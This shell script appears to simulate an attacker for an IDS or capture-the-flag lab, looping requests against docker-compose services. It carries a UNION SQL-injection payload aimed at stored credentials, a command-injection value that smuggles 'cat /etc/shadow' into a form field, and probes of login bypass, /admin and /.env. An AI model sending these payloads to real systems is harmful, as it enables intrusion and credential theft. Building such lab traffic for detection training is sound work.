#!/bin/sh
# ──────────────────────────────────────────────────────────────────────
# Automated attack simulation: Sentinel Defense Corp DMZ
#
# This script simulates an active threat actor performing automated
# reconnaissance and exploitation against the DMZ subnet. It sends
# two distinct attack vectors to the IDS sensor (honeypot) and probes
# the corporate web portal.
#
# Attack cadence: ~10 second cycle
# ──────────────────────────────────────────────────────────────────────

# Wait for target services to initialize
sleep 20

# Resolve targets by docker-compose service name
ANALYST="analyst"
TARGET="target"

echo "[*] Attack loop starting, targeting ${ANALYST} and ${TARGET}"

while true; do

    # ── Vector 1: SQL Injection via GET ──────────────────────────────
    # Targets the IDS sensor's web service with a UNION-based SQLi
    # payload. The campaign tracking tag is embedded in a URL parameter.
    curl -s -m 5 \
        "http://${ANALYST}/search?q=1'%20UNION%20SELECT%20username,password%20FROM%20credentials--&campaign=d3t3ct" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -H "Accept: text/html" \
        > /dev/null 2>&1

    sleep 3

    # ── Vector 2: Command Injection via POST ─────────────────────────
    # Targets the IDS sensor's diagnostic API with OS command injection
    # in the POST body. The exfil tag tracks data extraction.
    curl -s -m 5 \
        -X POST "http://${ANALYST}/api/diagnostic" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -d "host=10.200.0.1;cat /etc/shadow&exfil=rul3" \
        > /dev/null 2>&1

    sleep 3

    # ── Vector 3: Web portal reconnaissance ──────────────────────────
    # Probes the corporate web portal for vulnerable endpoints.
    # Uses a distinctive User-Agent string (attacker's tool signature).
    curl -s -m 5 \
        "http://${TARGET}/login?user=admin'--&pass=test" \
        -H "User-Agent: SentinelBreaker/wr1t3r" \
        > /dev/null 2>&1

    curl -s -m 5 \
        "http://${TARGET}/admin" \
        -H "User-Agent: SentinelBreaker/wr1t3r" \
        > /dev/null 2>&1

    curl -s -m 5 \
        "http://${TARGET}/.env" \
        -H "User-Agent: SentinelBreaker/wr1t3r" \
        > /dev/null 2>&1

    sleep 4
done
